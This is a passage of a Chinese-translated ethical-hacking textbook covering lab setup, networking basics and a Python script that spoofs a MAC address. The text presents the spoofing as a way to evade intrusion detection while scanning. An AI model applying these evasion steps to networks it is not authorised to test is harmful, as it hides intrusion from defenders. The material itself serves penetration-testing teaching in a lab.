  \ Python 3。\n\n## 安装 Python\n\n本章接下来需要设置的是 Python。本书中我们将使用 Python 版本 3，即 python3。Python\
  \ 3 是 Python 的 *主要* 版本，与旧的版本 2 不兼容。要下载 Python，请前往 https://www.python.org/ 并下载最新版本。截至撰写时，Python\
  \ 3.8 是推荐版本；然而，对于本书来说，3.2 以上的任何 Python 版本都应该可以。推荐使用 64 位版本的 Python。我将假设你使用 Windows\
  \ 作为主要操作系统；然而，本书中提到的代码也应该在 Linux 和 macOS 上运行，因为我们将运行虚拟机。\n\n### 在 Windows 上安装 Python\n\
  \n在 Windows 上安装 Python 的过程相当简单。打开你在 *安装虚拟操作系统* 部分中刚刚安装的 Windows 10 虚拟机。请注意，从现在开始，大多数工作将在这些虚拟机上完成，而不是承载这些虚拟机的访客操作系统。在安装过程中，只需勾选\
  \ **将 Python 3.8 添加到 PATH** 选项（版本号取决于你下载的版本），这样你就可以从命令提示符的任何位置访问 Python：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_48_0.png)\n\
  \n图 2.8 – Python 安装\n\n选择图 2.8 中突出显示的此选项后，点击 **立即安装**。安装完成后，关闭安装窗口并打开终端/命令提示符。在命令提示符中，只需输入\
  \ python 命令。你应该在终端中看到以下输出。Python shell 现在应该已打开：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_49_0.png)\n\
  \n图 2.9 – Python shell\n\n现在我们已在 Windows 中设置了 Python，让我们继续在 Kali 安装上进行设置。\n\n###\
  \ 在 Kali Linux 上安装 Python\n\n大多数渗透测试操作系统都已预装了 Python。要检查你的发行版是否已安装 Python，请打开 Kali\
  \ 并搜索终端。打开终端并在终端中输入以下命令：\n\n```\npython --version\n```\n\n你应该会看到以下输出：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_49_1.png)\n\
  \n图 2.10 – Python 版本\n\n前面的结果显示 Python 版本 2 已安装；然而，我们需要 Python 3。让我们再次使用以下命令检查：\n\
  \n```\npython3 --version\n```\n\n你应该会看到以下输出：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_49_2.png)\n\
  \n图 2.11 – Python 3 版本号\n\n前面的屏幕截图显示 Kali 中也已安装 Python 3，因此我们无需再次安装。\n\n## 集成开发环境\n\
  \nIDE 是一段帮助我们高效编写代码的软件。你也可以在记事本中编写 Python 脚本；然而，IDE 提供了帮助我们轻松编写代码的功能。有很多选择。我们将专注于免费的\
  \ IDE。我发现的最佳选择是 Visual Studio Code（VS Code），它完全免费。继续为两个虚拟操作系统 Windows 10 和 Kali\
  \ 下载 VS Code：https://code.visualstudio.com/download。\n\n在 Windows 上安装很简单：你需要按照安装程序进行操作。在\
  \ Linux 上安装需要你下载一个 Debian 软件包文件。打开终端并导航到下载文件的位置。然后，运行此命令：\n\n```\nsudo dpkg -i /path/to/file\n\
  ```\n\n它看起来会像这样：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_50_0.png)\n\n请注意，它会提示你输入密码以进行安装。\n\
  \n安装完成后，你需要安装扩展。打开 VS Code 并点击 VS Code 左侧的扩展选项卡，搜索 Python。它应该看起来像这样：\n\n\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_51_0.png)\n\
  \nFigure 2.13 – Python extension\n\n点击 Install 按钮，安装应该只需要几秒钟。现在你几乎已经准备好开始你的道德黑客之旅了。到目前为止，我们已经设置了虚拟操作系统，在这些机器上安装了\
  \ Python，并安装了 VS Code 以及相关的扩展，这些扩展将在我们的旅程中帮助我们。在下一节中，我们将进行一些网络配置以帮助我们。\n\n### Setting\
  \ up networking\n\n默认情况下，所有虚拟机都会为网络创建一个单独的虚拟接口。这意味着虚拟操作系统设备与你的主机操作系统处于不同的子网中。为了确保所有操作系统都在同一个子网中，请执行以下操作：\n\
  \n1. 进入每个虚拟机的设置。\n2. 在网络设置中，将 Attached to 选项选择为 Bridged Adapter。\n\n请确保同时对 Windows\
  \ 和 Kali 安装执行此操作：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_52_0.png)\n\nFigure\
  \ 2.14 – Setting the network adapter\n\n现在你的所有设备都将在同一个子网中。你应该能够从 Windows 10 安装 ping\
  \ 通 Kali 安装。\n\n### Updating Kali\n\n在继续之前，最好先更新 Kali 以确保一切都是最新的。Kali 可以使用以下命令进行更新：\n\
  \n```\nsudo apt-get update\nsudo apt-get upgrade\n```\n\n更新过程需要一些时间，因为它会更新所有仓库。\n\
  \n### Using virtual environments\n\nPython 有一个非常不错的功能叫做虚拟环境。使用这些虚拟环境，你可以跟踪不同 Python\
  \ 项目的依赖关系，并将不同项目与主环境隔离开来。\n\n让我们在 Kali 中创建一个新文件夹，所有项目文件都将放在这里：\n\n1. 打开你的 Kali 主目录并创建一个名为\
  \ `python-hacking` 的新文件夹。所有未来的工作都将在此进行。\n\n2. 在 VS Code 中打开此文件夹：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_53_0.png)\n\
  \nFigure 2.15 – Folder structure inside VS Code\n\n3. 在 `python-hacking` 文件夹内，创建一个名为\
  \ `m1-hello-world` 的新文件夹。在这里我们将测试我们的虚拟环境。在 `m1-hello-world` 文件夹内，创建一个名为 `main.py`\
  \ 的新文件。\n\n4. 使用以下命令在终端中检查 Python 包管理器 `pip` 是否已正确安装在 Kali 中：\n\n```\npip3 --version\n\
  ```\n\n你应该会看到以下输出：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_53_1.png)\n\nFigure\
  \ 2.16 – pip not installed\n\n5. 如果你看到与前面类似的输出，这意味着 `pip` 未安装在系统上。要安装 `pip`，请运行以下命令。确保系统已更新：\n\
  \n```\nsudo apt install python3-pip\n```\n\n一旦 pip 正确安装，输出将如下所示：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_53_2.png)\n\
  \nFigure 2.17 – pip installation\n\n如果 Windows 中尚未存在，也请安装 pip3。\n\n6. 现在打开 main.py\
  \ 文件并编写一些 Python 代码。我们将只使用以下代码。要在 VS Code 中打开终端，请按 Ctrl + `。\n\n7. 现在我们将安装一个 Python\
  \ 虚拟环境模块。运行以下命令进行安装：\n\n```\napt-get install python3-venv\n```\n\n8. 一旦 Python 虚拟环境模块安装完成，我们可以通过在终端中简单运行以下命令来创建一个\
  \ virtual-env 文件夹：\n\n```\npython3 -m venv my-virtualenv\n```\n\n9. 如果命令运行成功，你将看到一个名为\
  \ my-virtualenv 的新文件夹已创建。此文件夹包含一个与系统环境隔离的 Python 环境。要启用此环境，请运行以下命令：\n\n```\nsource\
  \ my-virtualenv/bin/activate\n```\n\n它看起来像 Figure 2.18 中的输出：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_54_0.png)\n\
  \nFigure 2.18 – Activating an environment\n\n一旦环境被激活，你会看到环境名称 my-virtualenv 显示在每条终端行的开头。现在你在此\
  \ shell 中使用 pip 安装的每个包都只会安装在此环境中，并与主环境隔离。\n\n在 python 文件中编写以下代码以测试一切是否正常工作：\n\n\
  ```\nif __name__ == \"__main__\":\n    print(\"Hello world\")\n```\n\n你应该会看到以下内容：\n\
  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_55_0.png)\n\nFigure 2.19 – Sample Python\
  \ script\n\n要运行它，请使用以下命令：\n\n```\npython3 main.py\n```\n\n你应该会看到以下内容：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_55_1.png)\n\
  \nFigure 2.20 – Running the Python script\n\n如果看到输出 hello world 显示出来，这意味着一切都已正确安装。\n\
  \n### Summary\n\n让我们总结一下本章我们做了什么。我们从在主机上下载和安装虚拟操作系统开始。然后我们在系统中配置了 Python，我们将在本书其余部分中使用它。然后我们为虚拟机配置了网络，并在本章末尾学习了如何在\
  \ Python 中使用虚拟环境。这些在后面的章节中将非常有帮助，当我们想要从代码中创建可分发的二进制文件时。在下一章中，我们将介绍网络的介绍以及它如何用于道德黑客。\n"
- '# Section 2: Thinking Like a Hacker – Network Information Gathering and Attacks


  本节的目的是开发可用于渗透测试的动手工具。本节将从应用信息收集技术开始，以开发能够让黑客攻击受害者机器并远程控制受害者机器的程序。在本节中，你将学习如何成功攻击一台机器并在受害者未察觉的情况下访问受害者机器的大部分内容。


  本书的这一部分包含以下章节：


  - Chapter 3, Reconnaissance and Information Gathering

  - Chapter 4, Network Scanning

  - Chapter 5, Man in the Middle Attacks

  '
- "## 3 Reconnaissance and Information Gathering\n\n在本章中，我们将学习网络基础知识。如果没有对计算机网络的扎实理解，你将无法在渗透测试和道德黑客领域走得很远。我们将介绍网络工作原理的一些基本细节。我们还将了解网络中不同的抽象层以及每个层的作用。\n\
  \n每个道德黑客流程都始于收集有关目标的相关信息，本章专门介绍我们可以获得哪些类型的信息以及这些信息如何对我们有用。我们将讨论用于描述网络层的标准 OSI 模型以及该模型如何对我们有所帮助。本章将涵盖以下主题：\n\
  \n- What is a computer network?\n- Classifying networks\n- Network stack\n- Network\
  \ entities\n- Protection\n- Changing MAC\n\n### What is a computer network?\n\n\
  在 **信息技术 (IT)** 领域，**网络** 意味着 *两台或更多设备* 能够 *通信* 并相互 *交换数据* 的 *能力*。在计算的早期，计算机无法相互通信，而是独立的系统。它们的功能非常有限。随着技术的进步，设备之间通信的需求日益增长。在最简单的形式中，两台通过\
  \ *介质* 相互连接的计算机形成了一个网络。这个介质是这些设备相互通信的 *链路*。随着我们的深入，你会看到计算机网络中的事情会变得非常复杂：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_60_0.png)\n\
  \n正如你在以下章节中会看到的那样，大多数现代计算机网络并非如此构建。为了让你的计算机与其他计算机通信，它需要与它拥有的计算机一样多的链路，这很快就会变得难以管理。我们将在\
  \ *Components of a computer network* 部分学习如何通过使用一个称为路由器的中间节点来避免这个问题。那么，当你想要一个包含 10\
  \ 台设备的网络时会发生什么呢？为此，我们可以让每台设备与每台其他设备之间都运行电缆并让它们通信。下面的图表显示了四台计算机相互通信。正如你能想象的那样，这样的系统会变得指数级难以管理。这有几个缺点。例如，它增加了系统的复杂性并浪费了大量资源，因为即使它们\
  \ *通信* 的时间非常短，你也需要在两台计算机之间维护一根电缆：\n\n\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_61_0.png)\n\
  \nFigure 3.2 – Network with four nodes\n\n为了消除这种冗余，我们可以引入一个中央设备来负责让不同的设备相互通信。有不同类型的中央设备，我们将在\
  \ Components of a basic computer network 部分中全部探讨：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_61_1.png)\n\
  \nFigure 3.3 – Network with a central device\n\n上图与我们家庭中的网络相似。一个中央设备——在我们的例子中是路由器——帮助我们与其他设备通信。这是一种非常原始的网络形式；现实生活中的网络比这个复杂得多。回到网络构成的概念，网络仅仅是两个通过介质相互通信并共享数据的设备。现在我们已经了解了网络是什么并开始讨论构建网络所需的内容，让我们详细查看组件。\n\
  \n## Components of a basic computer network\n\n在本节中，我们将学习计算机网络的不同组件。在计算机网络文献中，你经常会看到\
  \ *node* 这个术语用来表示网络中的一台计算机。在网络领域中，使用特定的命名法来识别网络中的特定设备。我们接下来将查看这些术语。\n\n### Node\n\
  \n节点通常是连接到 *central* 设备的设备。从某种意义上说，它是参与通信网络的计算机。这对于简单的小型网络是可行的，但随着网络中添加的设备越来越多，不同的设备开始承担不同的角色，因此我们只能在一定程度上将设备的角色在网络中简化为节点。在合格的场景中，节点可以是你的笔记本电脑、台式电脑、打印机、平板电脑、手机或任何其他网络连接设备。\n\
  \n### Server\n\n服务器是保存一些可以通过网络共享给需要它们的设备的信息的计算机。服务器通常 *online*，这意味着它们通过持续可用于其他设备来\
  \ *serve* 设备。\n\n### Transmission media\n\n设备在网络中相互连接并能够通信所使用的资源/链路称为 *transmission\
  \ media*。它可以是有线和无线的。有线传输介质的例子是 *Ethernet cable*，通常用于本地网络。*Wi-Fi* 是无线传输介质的例子。\n\n\
  ### Network interface card\n\n要参与网络，连接的节点/设备必须具有称为 **Network Interface Card (NIC)**\
  \ 的东西。NIC 的作用是将你想要传输的内容转换为传输介质所接受的形式。\n\n### Hub\n\n集线器是网络中的中央设备。如果你想与网络中的一个节点通信，你可能不会直接链接到该节点。相反，你应该通过某个中央设备——在这种情况下是集线器——建立链接。你的消息/数据将发送到集线器，然后集线器会将其广播到整个网络。根据消息的内容，相应的设备会做出回应。\n\
  \n### Switch\n\n交换机是一种特殊的集线器。与广播消息给所有节点的集线器不同，交换机只将消息发送给预期的接收者。这大大减少了网络上的流量，因为不打算接收消息的设备不应接收消息。\n\
  \n### Router\n\n到目前为止，我们一直在谈论单个网络。如果一台计算机想与不在你网络中的计算机交谈怎么办？如果这台计算机在法国，而预期的接收计算机在美国的网络中怎么办？我们可以将计算机互连的概念扩展到网络互连。路由器是帮助我们与外部网络通信的设备。\n\
  \n### Gateway\n\n网关是网络中的端点路由器。所有进出网络的流量都经过它。它充当互联网与本地设备之间的中介。对于我们自己的网络之外的设备来说，网关是本地网络中任何设备的通信主要点。\n\
  \n### Firewall\n\n防火墙是某些网络中的可选设备。防火墙可以是基于软件的，例如操作系统的防火墙，也可以是整个网络的基于硬件的设备。防火墙的作用是增强系统的安全性并监控网络流量。这确保了不会对网络进行未经授权的访问。防火墙通常会阻止所有进入本地网络的连接请求，除非这些请求已被授权并在防火墙的规则引擎中提及：\n\
  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_64_0.png)\n\nFigure 3.4 – Components\
  \ in a network\n\n顾名思义，它充当本地网络的入口点，也是出口点。出于实际原因和小型网络的原因，网络的小组件，如路由器、交换机、网关，有时甚至是防火墙，都合并到单个物理设备中。\n\
  \n在本节中，我们了解了网络的不同组件以及每个组件的作用。接下来，我们将讨论这些不同网络是如何分类的。\n\n## Classifying network\n\n\
  随着越来越多的计算机开始连接，将它们分类到不同的类别变得至关重要，以便我们可以使用它们。有各种方法可以进行分类；然而，最常见的是基于地理的网络分类。我们接下来将讨论这一点。\n\
  \n### Local area network\n\n当你将笔记本电脑或手机连接到家中 Wi-Fi 路由器时，你本质上参与了一个 **local area network\
  \ (LAN)**。连接到 LAN 的方式有多种，例如使用 Wi-Fi，这是一种无线连接，或使用有线连接，例如以太网电缆。LAN 的构成没有严格定义。然而，LAN\
  \ 通常由位于同一建筑物中同一区域的设备组成。LAN 可以简单到两个设备连接到路由器，也可以复杂到大学和办公室的 LAN。\n\n### Ethernet\n\n\
  以太网是 LAN 中使用最广泛的技术之一。现代以太网协议在 LAN 中提供非常高的速度。与无线介质相比，它非常可靠且安全。以太网协议定义了数据如何在 LAN 上传输。现代以太网可以提供每秒吉比特量级的速度。\n\
  \n### Wi-Fi\n\n作为以太网的补充，以太网使用物理电缆将设备连接到网络，而 Wi-Fi 允许设备通过无线介质相互连接。这消除了对电线的需求。需要注意的是，即使是无线，LAN\
  \ 上设备之间的通信也不是直接的。数据仍然通过一个中央路由器，即 **Access Point (AP)**，转发给预期接收者。\n\n这两种介质的比较如下：\n\
  \n| Feature | Wi-Fi | Ethernet |\n|---|---|---|\n| Transmission media | Over a wireless\
  \ channel | Connected through cables |\n| Accessibility | Everywhere we can receive\
  \ signals | Only by cables |\n| Speeds | Slow compared to cables | Fastest option\
  \ |\n| Reliability | Depends on the environment | Consistent |\n| Security | If\
  \ unencrypted, data can be intercepted easily over wireless channels | More secure\
  \ due to the need for physical interception |\n| deployment | Easy | Requires network\
  \ infrastructure such as ports and cables to be setup |\n| Latency | High and variable\
  \ | Low and consistent |\n\nTable 1.1 – Wi-Fi versus ethernet\n\n这两种介质各有利弊。无线对于普通用户来说使用起来容易得多，并给予他们在网络中更大的移动自由，而基于电缆的以太网速度快得多，并且在网络对移动性需求较低时经常使用。现在我们已经了解了\
  \ LAN，我们将开始查看其他基于地理的网络。\n\n### Personal area network\n\n与 LAN 相比，个人区域网络 PAN 通常非常小。PAN\
  \ 的范围仅在几十米量级。PAN 的一个例子是两个基于蓝牙的设备相互通信。在极少数情况下，PAN 也连接到 LAN。\n\n### Metropolitan area\
  \ networks\n\n有时，我们倾向于将几个小型局域网合并为一个单一类别。它们通常称为 metropolitan area networks (MANs)。MAN\
  \ 的一个例子是位于城市不同区域的政府办公室连接到单一网络。这些网络通常仅限于一个城市。\n\n\n\n\n\n## 广域网\n\n顾名思义，广域网（WAN）是指跨越较大地理区域的网络。WAN\
  \ 通常构成一个国家内部的网络。\n\n## 因特网\n\n到目前为止，我们只讨论了同一地理位置内的网络。互联网络，或因特网，是一个将位于不同地理位置的网络相互连接起来的巨型网络。通过这个庞大的网络，只要它也连接到因特网，你就可以与世界任何地方的任何设备进行通信。不同的\
  \ WAN 通过超高速光纤网络相互连接：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_67_0.png)\n\n图\
  \ 3.5 – 按规模划分的网络\n\n到目前为止，我们讨论了网络的物理组件和不同类型的网络。这让我们对计算机网络有一个概览。现在我们了解了网络的基础知识，就可以开始深入探讨数据如何在网络中从一个设备传输到另一个设备。\n\
  \n## 网络栈\n\n上一节为我们提供了网络的高层次介绍。现在，我们将学习实际的位和片段是如何在网络上传输的。\n\n## OSI 模型简介\n\n从你在应用程序上输入消息到它被交付给预期接收者，你的消息会经过通信系统中的不同层。为了帮助我们理解数据在到达目的地之前经过的所有通信过程和媒介，提出了一个框架来描述网络系统的功能。这个模型被称为开放系统互连（OSI）模型。这个模型不一定只适用于因特网，也可以应用于任何现代通信系统：\n\
  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_68_0.png)\n\n图 3.6 – 7 层 OSI 栈\n\nOSI\
  \ 模型包含 7 层，用来概念化数据如何在任何电子通信媒介上传输。让我们更详细地了解这些层。\n\n## 应用层\n\n应用层是 OSI 栈的最上层。这是用户交互的层。你使用的任何联网设备可能都有一个应用层界面。它充当用户输入/输出的端点。你发送的任何数据都会被添加到应用层，而你从他人接收的任何数据都会通过这一层显示。\n\
  \n## 表示层\n\n这一层位于应用层之下，负责将数据转换为有用的格式。来自应用层的数据格式各不相同，通常对通信系统来说并不是最易读的形式。在这里，数据会被转换为合适的形式。此外，用户数据在应用层并未加密。在表示层，通常会为数据添加加密以确保安全。\n\
  \n## 会话层\n\n在表示层之下是会话层。一旦数据准备好发送，发送设备和接收设备必须建立连接，以便它们可以通过通道发送数据。会话层正是帮助完成这一任务的——它在你的设备与接收设备之间建立连接。\n\
  \n## 传输层\n\n一旦两个设备之间建立了会话，数据就可以通过通道发送。传输层将要发送的实际数据划分为更小且可管理的块，称为 *段*，这些块可以通过链路发送。它还负责接收来自其他设备的数据段并重新组装以供你使用。\n\
  \n传输层还负责流量控制和错误控制。不同的传输媒介具有不同的速度和不同的错误率。传输层的工作是确保正确的数据被传输。\n\n## 网络层\n\n当我们想要与不在同一网络中的设备通信时，网络层的角色就发挥作用了。网络层将来自传输层的\
  \ *段* 进一步分解为更小的 *数据包*。网络层还确定数据包到达目的地的最佳路径。\n\n## 数据链路层\n\n这与网络层 somewhat 相似；然而，它促进同一网络中设备之间的通信。数据链路层将数据包分解为帧。\n\
  \n## 物理层\n\n这是栈的最底层，也是用户输入的数据被转换为可通过传输媒介传输的物理信号的地方。在数字系统的情况下，这意味着数据的 0 和 1 被转换为物理系统中的合适表示，例如电压电平。\n\
  \n## 完整周期\n\n通信的完整周期如下：\n\n## 开放系统互连模型\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_70_0.png)\n\
  \n图 3.7 – OSI 栈中的数据传输\n\n用户输入的数据从应用层到物理层，然后在另一端从物理层到应用层。\n\n## TCP/IP 模型\n\n前面显示的模型是一个非常通用的模型，用来概念化任何媒介中的通信。然而，计算机网络的工作方式是\
  \ OSI 模型的一个特例，通常被称为 TCP/IP 模型。你经常会在文献中看到这个模型，而不是更通用的 OSI 模型：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_70_1.png)\n\
  \n图 3.8 – TCP/IP 栈\n\n与具有七层的 OSI 模型相比，因特网栈有四层。让我们更详细地了解它们。\n\n## 应用层\n\n这是最上层。该层负责进程到进程的通信。常见的应用层协议包括\
  \ HTTP、FTP、SSH、DNS 等。\n\n## 传输层\n\nTCP 和 UDP 是该层的常见协议。该层负责端到端通信和错误控制。TCP 是面向连接的，而\
  \ UDP 是无连接协议。\n\n## 因特网层\n\n这一层与 OSI 栈中的网络层相对应。它定义了负责在节点之间逻辑传输数据的协议。其中最著名的协议之一是\
  \ IP 协议，它使用 IP 地址在设备之间通信。\n\n## 网络访问层\n\n这一层结合了 OSI 栈中的数据链路层和物理层。\n\n## 映射 OSI 和\
  \ TCP/IP 栈\n\nOSI 和 TCP/IP 栈的层映射如下：\n\n| OSI 模型 | TCP/IP 模型 |\n|---|---|\n| 应用层\
  \ | 应用层 |\n| 表示层 | |\n| 会话层 | |\n| 传输层 | 传输层 |\n| 网络层 | 因特网层 |\n| 数据链路层 | 链路层 |\n\
  | 物理层 | |\n\n图 3.9 – TCP/IP 和 OSI 栈的映射\n\n## 公共 IP 地址与私有 IP 地址\n\n公共 IP 地址与私有 IP\
  \ 地址的主要区别如下：\n\n| 公共 IP | 私有 IP |\n|---|---|\n| 公共 IP 是因特网所看到的 IP 地址。 | 私有 IP 用于你的本地网络内部。\
  \ |\n| 允许直接访问。 | 你家庭网络中设备的 IP 地址。 |\n| 全球唯一。 | 可以被视为一个昵称。 |\n| 当你在 Google 中输入我的\
  \ IP 地址时看到的就是它。 | 在 Windows 或 Linux/macOS 中使用 ipconfig 或 ifconfig 查找此地址。 |\n|  |\
  \ 全球不唯一。相同的 IP 可以在不同的网络中使用。 |\n|  | 通常形式为 192.168.1.X，其中 X 在 1-255 之间。注意，这可能因你的网络配置而异。\
  \ |\n\n表 3.2 – 公共 IP 地址与私有 IP 地址之间的差异\n\n我们迄今为止看到的 IP 地址是 IPv4 地址，它们非常流行。然而，还有其他地址。让我们来看看。\n\
  \n## IPv4 与 IPv6\n\n到目前为止，我们所了解的 IP 地址称为 IPv4 地址。还有另一种 IP 地址版本称为 IPv6。这些是 128 位地址。它们被创建用于未来的计算系统。然而，由于\
  \ NAT 协议的使用，其采用速度缓慢。目前，只有 40% 的因特网支持 IPv6 地址。\n\n## MAC 地址\n\nMAC 地址也称为硬件地址，通常与\
  \ NIC 卡相关联。每个 NIC 都有自己的 MAC 地址。MAC 地址是由制造商分配的物理号码。每个制造商都被分配一个号码池，可用于制造其产品。MAC 地址是一个\
  \ 48 位数字：\n\n\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_75_0.png)\n\nFigure 3.11\
  \ – MAC address bytes\n\n接下来，让我们讨论端口。\n\n## Ports\n\n虽然 MAC 地址唯一标识了 NIC，数据使用它来识别应该发送到的正确设备，但端口标识了\
  \ PC 上运行的唯一服务。它充当通信的逻辑端点。每个设备都有多个应用程序通过网络发送或接收数据。例如，你可以在 PC 上浏览网页，同时在后台运行下载，另一个服务正在向服务器上传数据。一旦数据到达你的\
  \ PC，它会使用端口来区分数据所属的不同进程。系统总共有 65,535 个端口。其中前 1,024 个中有一些是保留的，不建议使用这些端口。\n\n## Protection\n\
  \n到目前为止，本章我们学习了计算机网络的基础知识，这对于理解本书的其余部分至关重要。现在，我们将开始研究可以用哪些参数来追踪我们，以及我们如何保护自己。在上一章中，我们了解到道德黑客的第一步是信息收集。但在开始收集信息之前，我们必须确保我们的身份得到保护。否则，我们很容易被追踪。你的身份可以通过许多参数被追溯回你。最常见的是你的\
  \ IP 地址和你的 MAC 地址。\n\n要掩盖你的公共 IP 地址，你可以使用 **Virtual Private Networks (VPNs)**。我们不会讨论\
  \ VPN，因为它们不在本书的范围之内。这里需要注意的一点是，你不应完全信任你的 VPN 提供商。从安全角度来看，使用 VPN 只是意味着你将信任从你的 **internet\
  \ service provider (ISP)** 转移到另一家提供 VPN 服务的公司。你在选择 VPN 时应非常谨慎，从网络安全角度来看，你应非常谨慎对待免费\
  \ VPN，因为其中很多捆绑了恶意软件或使用你的 PC 资源用于其他目的，例如比特币挖矿。一些 VPN 即使声称可以掩盖你的身份，也会泄露你的 **domain\
  \ name server (DNS)**，即用于将网站名称映射到 IP 地址的服务器。\n\n然而，当我们扫描本地网络时，我们可以通过 MAC 地址被追踪。在\
  \ *Chapter 2, Getting Started – Setting Up Your Lab Environment* 中，我们安装了两台虚拟机：Kali\
  \ 和 Windows 10。Kali 机器将是我们攻击机。我们的机器有一个 NIC，用于与其他设备通信。该 NIC 有一个 MAC 地址。在 *Changing\
  \ our MAC address* 部分，我们将尝试伪造一个 MAC 地址，以便在扫描时更改它。通过这样做，即使 **intrusion detection\
  \ system (IDS)** 发现我们在扫描 PC 上的端口，它也找不到我们的真实 MAC 地址。\n\n## Changing our MAC address\n\
  \n在本节中，我们将尝试在 Kali 机器上更改 MAC 地址。让我们启动 Kali 机器并打开一个终端。要更改 MAC 地址，你需要安装 net-tools\
  \ 包。在大多数 Linux 发行版中，该工具已经可用。但是，如果未安装，你可以使用以下命令安装它：\n\n```\nsudo apt-get update -y\n\
  ```\n\n```\nsudo apt-get install -y net-tools\n```\n\n它会提示你输入密码，即 kali。安装工具后，你可以使用以下命令查看\
  \ MAC 地址：\n\n```\nsudo ifconfig\n```\n\n如果一切顺利，你将看到类似以下的输出：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_77_0.png)\n\
  \nFigure 3.12 – ifconfig command output\n\n这里有很多内容需要解析，让我们逐步分解。这里有两个值，称为 eth0 和\
  \ lo。eth0 是 NIC 的名称，而 lo 是回环适配器。现在我们可以忽略回环适配器。inet 字段代表 Kali 机器的私有 IP 地址。inet6 是\
  \ Kali 机器的 IPv6 地址。ether 是 MAC 地址，这就是我们想要更改的字段。\n\n如果你想更改 MAC 地址，不能在 NIC 开启时进行。首先，你必须关闭网络接口。要关闭接口，你可以使用以下命令：\n\
  \n```\nsudo ifconfig eth0 down\n```\n\n此命令将关闭名为 eth0 的 NIC。如果命令输出中没有错误，这意味着命令成功运行。\n\
  \n现在，如果你再次输入 ifconfig 命令，你将看到以下输出：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_77_1.png)\n\
  \nFigure 3.13 – Shutting down a network interface card\n\n现在，你将只看到回环适配器，并且 eth0\
  \ 已被关闭。要更改 MAC 地址，你可以运行以下命令。假设你希望新的 MAC 地址为 00:11:22:33:44:55。这里，你可以执行以下操作：\n\n\
  ```\nsudo ifconfig eth0 hw ether 00:11:22:33:44:55\n```\n\n此命令更改 eth0 接口和该 NIC 的\
  \ ether 参数：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_78_0.png)\n\nFigure 3.14\
  \ – Changing MAC address\n\n现在，如果没有错误，这意味着命令成功运行。此时，我们可以通过运行以下命令再次打开接口：\n\n```\n\
  sudo ifconfig eth0 up\n```\n\n现在，让我们再次运行 ifconfig 命令，看看我们的更改是否生效：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_78_1.png)\n\
  \nFigure 3.15 – Changed MAC address\n\n在这里，你可以看到 MAC 地址已成功更改。现在，如果我们想在网络中扫描某物，将显示此\
  \ MAC 地址而不是我们的真实 MAC 地址。\n\n## Creating a Python script\n\n到目前为止，我们已经编写了手动命令来更改\
  \ MAC。理想情况下，我们希望编写一个 Python 脚本来帮助我们更改它。为此，我们需要找到一种方法借助 Python 运行 bash 命令。幸运的是，Python\
  \ 有一个标准库用于运行系统命令，称为 subprocess。该库允许你与底层操作系统交互。\n\n要将此库导入你的模块，你只需编写以下命令：\n\n```\n\
  import subprocess\n```\n\n要运行命令，subprocess 有一个名为 run 的方法。使用此方法，你可以在操作系统上执行系统命令。如果你想查看\
  \ eth0 的信息，你可以运行以下命令：\n\n```\nsubprocess.run(\n    [\"ifconfig\", \"eth0\"],\n \
  \   shell=True,\n)\n```\n\n此函数需要一个命令列表。另一个参数 shell=true 意味着我们希望将输出打印到控制台。\n\n如果你运行前一个文件，你将看到类似于运行\
  \ ifconfig eth0 命令的输出。请注意，你需要以 root 用户身份运行命令，因此它应如下所示：\n\n```\nsudo python3 main.py\n\
  ```\n\n以下是输出：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_80_0.png)\n\nFigure 3.16\
  \ – Running system commands using Python\n\n现在你知道了如何使用 Python 运行系统命令，你可以使用 Python\
  \ 重复前面的命令。完整代码如下：\n\n```\nimport subprocess\n\nif __name__ == \"__main__\":\n  \
  \  interface = \"eth0\"\n    new_mac = \"22:11:22:33:44:57\"\n\n    print(\"Shutting\
  \ down the interface\")\n    subprocess.run([\"ifconfig\", \"eth0\", \"down\"])\n\
  \n    print(\"changing the interface hw address of \", interface, \" to \", new_mac)\n\
  \    subprocess.run([\"ifconfig\", interface, \"hw\", \"ether\", new_mac])\n   \
  \ print(\"MAC address changed to \", new_mac)\n    subprocess.run([\"ifconfig\"\
  , interface, \"up\"])\n\n    print(\"network interfaced turned on\")\n```\n\n如果你再次检查接口，你将能够看到新的\
  \ MAC 地址：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_81_0.png)\n\nFigure 3.17 –\
  \ New MAC address\n\n现在我们已经学习了如何在系统上运行命令以及如何使用 Python 更改系统的 MAC 地址，我们将在此停止讨论。在下一章中，我们将研究信息收集。\n\
  \n## Summary\n\n在本章中，我们学习了网络的基础知识，以及我们如何通过伪造 MAC 地址来保护自己在本地网络上的扫描目的。本章帮助我们更深入地了解计算机系统的网络方面，以及我们如何使用\
  \ Python 来保护和掩盖我们在本地网络中的身份。在下一章中，我们将学习如何扫描本地网络。\n\n\n\n\n"
- "# 4 网络扫描\n\n本章介绍道德黑客的第一阶段：信息收集和侦察。信息收集是道德黑客最重要的方面之一。如果没有获得所需信息的适当访问权限，要成功实施攻击将极其困难。我们将学习什么是网络扫描以及它如何用于在网络中实施攻击。本章将介绍以下主题：\n\
